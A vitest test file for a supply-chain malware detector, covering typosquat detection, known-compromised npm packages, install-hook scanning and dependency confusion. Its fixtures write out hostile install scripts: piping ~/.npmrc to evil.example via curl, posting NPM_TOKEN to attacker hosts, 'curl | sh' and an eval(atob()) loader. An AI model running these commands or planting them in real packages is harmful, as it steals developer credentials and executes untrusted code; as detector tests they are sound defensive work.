/**
 * Tests for malicious-detector.ts
 *
 * Validates the deterministic supply-chain oracles: typosquat detection
 * (Damerau-Levenshtein vs top-N), install-script reader, and the
 * suspicious-pattern scanner that runs over package.json scripts and
 * referenced script files.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import {
  damerauLevenshtein,
  checkTyposquat,
  checkKnownCompromisedPackage,
  inspectInstallScripts,
  scanForMaliciousPatterns,
  scanTransitiveDependencies,
  checkDependencyConfusion,
  isInternalPackageName,
  KNOWN_COMPROMISED_PACKAGES,
  TYPOSQUAT_TARGETS,
  type TransitivePackage,
  type RegistryProbeResult,
} from "./malicious-detector.js";

let tmp: string;

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "malicious-detector-test-"));
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

function fakePackage(name: string, opts: { scripts?: Record<string, string>; files?: Record<string, string> } = {}): string {
  const dir = join(tmp, "pkg");
  mkdirSync(dir, { recursive: true });
  const pkgJson = {
    name,
    version: "1.0.0",
    scripts: opts.scripts ?? {},
  };
  writeFileSync(join(dir, "package.json"), JSON.stringify(pkgJson, null, 2));
  if (opts.files) {
    for (const [rel, content] of Object.entries(opts.files)) {
      const abs = join(dir, rel);
      const parent = abs.slice(0, abs.lastIndexOf("/"));
      mkdirSync(parent, { recursive: true });
      writeFileSync(abs, content);
    }
  }
  return dir;
}

// ────────────────────────────────────────────────────────────────────
// damerauLevenshtein
// ────────────────────────────────────────────────────────────────────

describe("damerauLevenshtein", () => {
  it("returns 0 for identical strings", () => {
    expect(damerauLevenshtein("lodash", "lodash")).toBe(0);
  });

  it("counts a single substitution as 1", () => {
    expect(damerauLevenshtein("lodash", "lodush")).toBe(1);
  });

  it("counts an adjacent transposition as 1 (the loadsh case)", () => {
    expect(damerauLevenshtein("loadsh", "lodash")).toBe(1);
  });

  it("counts insert/delete as 1", () => {
    expect(damerauLevenshtein("lodash", "lodashs")).toBe(1);
    expect(damerauLevenshtein("lodash", "lodas")).toBe(1);
  });

  it("returns the full string length when one input is empty", () => {
    expect(damerauLevenshtein("", "lodash")).toBe(6);
    expect(damerauLevenshtein("lodash", "")).toBe(6);
  });
});

// ────────────────────────────────────────────────────────────────────
// checkTyposquat
// ────────────────────────────────────────────────────────────────────

describe("checkTyposquat", () => {
  it("flags loadsh as a typosquat of lodash (transposition, distance 1)", () => {
    const hit = checkTyposquat("loadsh");
    expect(hit).not.toBeNull();
    expect(hit?.target).toBe("lodash");
    expect(hit?.distance).toBe(1);
  });

  it("flags crossenv as a typosquat of cross-env", () => {
    const hit = checkTyposquat("crossenv");
    expect(hit).not.toBeNull();
    // Either cross-env (closest) or any other top-N package within 2
    expect(hit?.distance).toBeLessThanOrEqual(2);
  });

  it("flags lodahs as a typosquat of lodash (substitution + transposition)", () => {
    const hit = checkTyposquat("lodahs");
    expect(hit).not.toBeNull();
    expect(hit?.target).toBe("lodash");
  });

  it("returns null for the real package name", () => {
    expect(checkTyposquat("lodash")).toBeNull();
    expect(checkTyposquat("react")).toBeNull();
  });

  it("returns null for an obviously unrelated name", () => {
    expect(checkTyposquat("supercalifragilisticexpialidocious")).toBeNull();
  });

  it("strips scope and lowercases", () => {
    // @types/lodash itself is not typosquatted but the scope should not throw
    expect(() => checkTyposquat("@types/lodash")).not.toThrow();
    // Capitals normalized
    expect(checkTyposquat("LoadSh")?.target).toBe("lodash");
  });

  it("knows that lodash is in the TYPOSQUAT_TARGETS list", () => {
    expect(TYPOSQUAT_TARGETS.includes("lodash")).toBe(true);
    expect(TYPOSQUAT_TARGETS.includes("react")).toBe(true);
    expect(TYPOSQUAT_TARGETS.includes("axios")).toBe(true);
  });
});

// ────────────────────────────────────────────────────────────────────
// checkKnownCompromisedPackage
// ────────────────────────────────────────────────────────────────────

describe("checkKnownCompromisedPackage", () => {
  it("flags event-stream as historically compromised", () => {
    const hit = checkKnownCompromisedPackage("event-stream");
    expect(hit).not.toBeNull();
    expect(hit?.severity).toBe("critical");
    expect(hit?.title).toContain("event-stream");
  });

  it("flags scoped/cased package names after normalization", () => {
    const hit = checkKnownCompromisedPackage("ESLint-Scope");
    expect(hit).not.toBeNull();
    expect(hit?.title).toContain("eslint-scope");
  });

  it("returns null for unrelated packages", () => {
    expect(checkKnownCompromisedPackage("express")).toBeNull();
    expect(checkKnownCompromisedPackage("react")).toBeNull();
  });

  it("contains the benchmark's historical compromise cases", () => {
    expect(KNOWN_COMPROMISED_PACKAGES["event-stream"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["ua-parser-js"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["coa"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["rc"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["eslint-scope"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["bigchaindb-driver"]).toBeDefined();
    expect(KNOWN_COMPROMISED_PACKAGES["circle.js"]).toBeDefined();
  });
});

// ────────────────────────────────────────────────────────────────────
// inspectInstallScripts
// ────────────────────────────────────────────────────────────────────

describe("inspectInstallScripts", () => {
  it("reports no install hooks for a benign package", () => {
    const dir = fakePackage("benign-pkg", { scripts: { test: "vitest" } });
    const result = inspectInstallScripts(dir);
    expect(result.hasInstallHook).toBe(false);
    expect(result.hooks).toHaveLength(0);
    expect(result.matches).toHaveLength(0);
  });

  it("reports a preinstall hook with no suspicious patterns as benign-but-present", () => {
    const dir = fakePackage("noop-hook", {
      scripts: { preinstall: "echo hello" },
    });
    const result = inspectInstallScripts(dir);
    // echo hello is filtered out as a no-op via the trivial-prefix check
    expect(result.hasInstallHook).toBe(false);
  });

  it("flags a postinstall hook that runs node on a local script", () => {
    const dir = fakePackage("malicious-postinstall", {
      scripts: { postinstall: "node lib/install.js" },
      files: {
        "lib/install.js": "console.log('totally benign');",
      },
    });
    const result = inspectInstallScripts(dir);
    expect(result.hasInstallHook).toBe(true);
    expect(result.hooks).toHaveLength(1);
    expect(result.hooks[0]).toEqual({
      name: "postinstall",
      command: "node lib/install.js",
    });
  });

  it("matches eval/atob in the referenced install script", () => {
    const dir = fakePackage("eval-payload", {
      scripts: { preinstall: "node ./loader.js" },
      files: {
        "loader.js": "eval(atob('Y29uc29sZS5sb2coJ3B3bicpOw==')); fetch('http://attacker.example/x');",
      },
    });
    const result = inspectInstallScripts(dir);
    expect(result.hasInstallHook).toBe(true);
    expect(result.matches.length).toBeGreaterThanOrEqual(2);
    const labels = result.matches.map((m) => m.label);
    expect(labels.some((l) => l.includes("eval"))).toBe(true);
    expect(labels.some((l) => l.includes("atob"))).toBe(true);
  });

  it("matches credential-theft patterns in the install hook command itself", () => {
    const dir = fakePackage("npmrc-stealer", {
      scripts: { preinstall: "cat ~/.npmrc | curl -X POST -d @- http://evil.example/" },
    });
    const result = inspectInstallScripts(dir);
    expect(result.matches.some((m) => m.label.includes(".npmrc"))).toBe(true);
  });

  it("matches NPM_TOKEN env var read", () => {
    const dir = fakePackage("token-stealer", {
      scripts: { preinstall: "node -e 'fetch(\"http://x\", {method:\"POST\", body: process.env.NPM_TOKEN})'" },
    });
    const result = inspectInstallScripts(dir);
    expect(result.matches.some((m) => m.label.includes("NPM_TOKEN"))).toBe(true);
  });
});

// ────────────────────────────────────────────────────────────────────
// scanForMaliciousPatterns — full Finding[] entry point
// ────────────────────────────────────────────────────────────────────

describe("scanForMaliciousPatterns", () => {
  it("emits a historical-compromise finding for event-stream", () => {
    const dir = fakePackage("event-stream");
    const findings = scanForMaliciousPatterns({ packageName: "event-stream", packagePath: dir });
    const finding = findings.find((f) => f.templateId === "malicious-known-compromise");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("critical");
    expect(finding?.description).toContain("currently installed tarball");
  });

  it("emits a typosquat finding for loadsh", () => {
    const dir = fakePackage("loadsh");
    const findings = scanForMaliciousPatterns({ packageName: "loadsh", packagePath: dir });
    const typoFinding = findings.find((f) => f.templateId === "malicious-typosquat");
    expect(typoFinding).toBeDefined();
    expect(typoFinding?.severity).toBe("critical");
    expect(typoFinding?.title).toContain("lodash");
  });

  it("emits an install-hook finding for a package with preinstall + suspicious script", () => {
    const dir = fakePackage("install-payload", {
      scripts: { preinstall: "node lib/init.js" },
      files: {
        "lib/init.js": "child_process.exec('curl http://x | sh');",
      },
    });
    const findings = scanForMaliciousPatterns({ packageName: "install-payload", packagePath: dir });
    const hookFinding = findings.find((f) => f.templateId === "malicious-install-hook");
    expect(hookFinding).toBeDefined();
    expect(hookFinding?.severity).toBe("high");
    expect(hookFinding?.description).toContain("preinstall");
  });

  it("emits BOTH a typosquat AND an install-hook finding when applicable", () => {
    const dir = fakePackage("loadsh", {
      scripts: { preinstall: "node lib/p.js" },
      files: { "lib/p.js": "fetch('http://attacker/' + process.env.NPM_TOKEN);" },
    });
    const findings = scanForMaliciousPatterns({ packageName: "loadsh", packagePath: dir });
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.some((f) => f.templateId === "malicious-typosquat")).toBe(true);
    expect(findings.some((f) => f.templateId === "malicious-install-hook")).toBe(true);
  });

  it("emits zero findings for the real lodash package with no scripts", () => {
    const dir = fakePackage("lodash");
    const findings = scanForMaliciousPatterns({ packageName: "lodash", packagePath: dir });
    expect(findings).toHaveLength(0);
  });

  it("populates evidence fields on every finding", () => {
    const dir = fakePackage("loadsh");
    const findings = scanForMaliciousPatterns({ packageName: "loadsh", packagePath: dir });
    for (const f of findings) {
      expect(f.evidence?.request).toBeTruthy();
      expect(f.evidence?.response).toBeTruthy();
      expect(f.evidence?.analysis).toBeTruthy();
      expect(typeof f.confidence).toBe("number");
      expect(f.timestamp).toBeGreaterThan(0);
    }
  });

  it("attributes findings as direct by default", () => {
    const dir = fakePackage("loadsh");
    const findings = scanForMaliciousPatterns({
      packageName: "loadsh",
      packagePath: dir,
      packageVersion: "1.2.3",
    });
    expect(findings.length).toBeGreaterThan(0);
    for (const f of findings) {
      expect(f.supplyChain?.relation).toBe("direct");
      expect(f.supplyChain?.package).toBe("loadsh@1.2.3");
      expect(f.supplyChain?.depth).toBe(0);
    }
  });
});

// ────────────────────────────────────────────────────────────────────
// scanTransitiveDependencies (issue #565)
// ────────────────────────────────────────────────────────────────────

/** Build a package dir at an arbitrary subpath under `tmp` (for tree fixtures). */
function makePackageAt(
  rel: string,
  name: string,
  version: string,
  opts: { scripts?: Record<string, string>; files?: Record<string, string> } = {},
): string {
  const dir = join(tmp, rel);
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name, version, scripts: opts.scripts ?? {} }, null, 2),
  );
  for (const [f, content] of Object.entries(opts.files ?? {})) {
    const abs = join(dir, f);
    mkdirSync(abs.slice(0, abs.lastIndexOf("/")), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}

describe("scanTransitiveDependencies", () => {
  it("source-audits a malicious transitive dep and attributes it (clean root)", () => {
    const evilDir = makePackageAt("nm/evil-dep", "evil-dep", "9.9.9", {
      scripts: { postinstall: "node steal.js" },
      files: { "steal.js": "fetch('http://evil.example/' + process.env.NPM_TOKEN);" },
    });
    const cleanDir = makePackageAt("nm/clean-dep", "clean-dep", "1.0.0");

    const packages: TransitivePackage[] = [
      { name: "evil-dep", version: "9.9.9", path: evilDir, depth: 2, dependencyPath: ["my-app", "clean-dep", "evil-dep"] },
      { name: "clean-dep", version: "1.0.0", path: cleanDir, depth: 1, dependencyPath: ["my-app", "clean-dep"] },
    ];

    const result = scanTransitiveDependencies({ rootName: "my-app", packages });
    expect(result.scanned).toBe(2);
    const hook = result.findings.find((f) => f.templateId === "malicious-install-hook");
    expect(hook).toBeDefined();
    expect(hook?.supplyChain?.relation).toBe("transitive");
    expect(hook?.supplyChain?.package).toBe("evil-dep@9.9.9");
    expect(hook?.title).toContain("[transitive]");
    expect(hook?.description).toContain("evil-dep@9.9.9");
    expect(hook?.description).toContain("my-app › clean-dep › evil-dep");
  });

  it("never re-audits the root package", () => {
    const rootDir = makePackageAt("nm/my-app", "my-app", "1.0.0", {
      scripts: { postinstall: "node x.js" },
      files: { "x.js": "eval(atob('Zm9v'));" },
    });
    const packages: TransitivePackage[] = [
      { name: "my-app", version: "1.0.0", path: rootDir, depth: 1 },
    ];
    const result = scanTransitiveDependencies({ rootName: "my-app", packages });
    expect(result.scanned).toBe(0);
    expect(result.findings).toHaveLength(0);
  });

  it("dedupes by name@version (diamond dependency audited once)", () => {
    const a = makePackageAt("nm/a/dup", "dup", "1.0.0", {
      scripts: { postinstall: "node p.js" },
      files: { "p.js": "child_process.exec('curl http://x|sh');" },
    });
    const b = makePackageAt("nm/b/dup", "dup", "1.0.0", {
      scripts: { postinstall: "node p.js" },
      files: { "p.js": "child_process.exec('curl http://x|sh');" },
    });
    const packages: TransitivePackage[] = [
      { name: "dup", version: "1.0.0", path: a, depth: 1 },
      { name: "dup", version: "1.0.0", path: b, depth: 2 },
    ];
    const result = scanTransitiveDependencies({ rootName: "root", packages });
    expect(result.scanned).toBe(1);
  });

  it("is budget-bounded and reports skipped packages", () => {
    const packages: TransitivePackage[] = [];
    for (let i = 0; i < 5; i++) {
      const dir = makePackageAt(`nm/loadsh${i}`, "loadsh", `${i}.0.0`);
      packages.push({ name: "loadsh", version: `${i}.0.0`, path: dir, depth: 1 });
    }
    const result = scanTransitiveDependencies({ rootName: "root", packages, maxPackages: 2 });
    expect(result.scanned).toBe(2);
    expect(result.skipped).toBe(3);
  });

  it("returns nothing when budget is 0", () => {
    const dir = makePackageAt("nm/loadsh", "loadsh", "1.0.0");
    const result = scanTransitiveDependencies({
      rootName: "root",
      packages: [{ name: "loadsh", version: "1.0.0", path: dir, depth: 1 }],
      maxPackages: 0,
    });
    expect(result.scanned).toBe(0);
    expect(result.findings).toHaveLength(0);
  });
});

// ────────────────────────────────────────────────────────────────────
// Dependency-confusion (issue #565)
// ────────────────────────────────────────────────────────────────────

describe("isInternalPackageName", () => {
  it("matches a scoped name against an internal scope", () => {
    expect(isInternalPackageName("@acme/widgets", ["@acme"], [])).toBe(true);
    expect(isInternalPackageName("@acme/widgets", ["@acme/"], [])).toBe(true);
  });
  it("does not match a different scope", () => {
    expect(isInternalPackageName("@other/widgets", ["@acme"], [])).toBe(false);
    // @acme prefix must be scope-delimited, not a substring of another scope
    expect(isInternalPackageName("@acme-corp/widgets", ["@acme"], [])).toBe(false);
  });
  it("matches an exact unscoped internal name (case-insensitive)", () => {
    expect(isInternalPackageName("acme-internal", [], ["acme-internal"])).toBe(true);
    expect(isInternalPackageName("ACME-Internal", [], ["acme-internal"])).toBe(true);
  });
  it("returns false with no config", () => {
    expect(isInternalPackageName("@acme/widgets")).toBe(false);
  });
});

describe("checkDependencyConfusion", () => {
  const exists = (over: Partial<RegistryProbeResult> = {}): RegistryProbeResult => ({
    exists: true,
    latestVersion: "3.0.0",
    ...over,
  });

  it("flags an internal scoped name that also exists publicly", async () => {
    const finding = await checkDependencyConfusion({
      packageName: "@acme/widgets",
      version: "1.0.0",
      internalScopes: ["@acme"],
      probe: async () => exists(),
    });
    expect(finding).not.toBeNull();
    expect(finding?.templateId).toBe("malicious-dependency-confusion");
    expect(finding?.category).toBe("supply-chain");
    expect(finding?.severity).toBe("high");
    expect(finding?.description).toContain("public latest: 3.0.0");
  });

  it("does not flag an internal name that is NOT on the public registry", async () => {
    const finding = await checkDependencyConfusion({
      packageName: "@acme/widgets",
      version: "1.0.0",
      internalScopes: ["@acme"],
      probe: async () => ({ exists: false }),
    });
    expect(finding).toBeNull();
  });

  it("does not flag a public package that is not declared internal", async () => {
    const probe = vi.fn(async () => exists());
    const finding = await checkDependencyConfusion({
      packageName: "lodash",
      version: "1.0.0",
      internalScopes: ["@acme"],
      probe,
    });
    expect(finding).toBeNull();
    // Allow-list filter runs first — no network probe for non-internal names.
    expect(probe).not.toHaveBeenCalled();
  });

  it("escalates to critical on a maintainer mismatch", async () => {
    const finding = await checkDependencyConfusion({
      packageName: "@acme/widgets",
      version: "1.0.0",
      internalScopes: ["@acme"],
      internalMaintainers: ["acme-bot"],
      probe: async () => exists({ maintainers: ["totally-not-acme"] }),
    });
    expect(finding?.severity).toBe("critical");
    expect(finding?.description).toContain("Maintainer mismatch");
  });

  it("fails soft (returns null) when the probe throws", async () => {
    const finding = await checkDependencyConfusion({
      packageName: "@acme/widgets",
      version: "1.0.0",
      internalScopes: ["@acme"],
      probe: async () => {
        throw new Error("network down");
      },
    });
    expect(finding).toBeNull();
  });
});
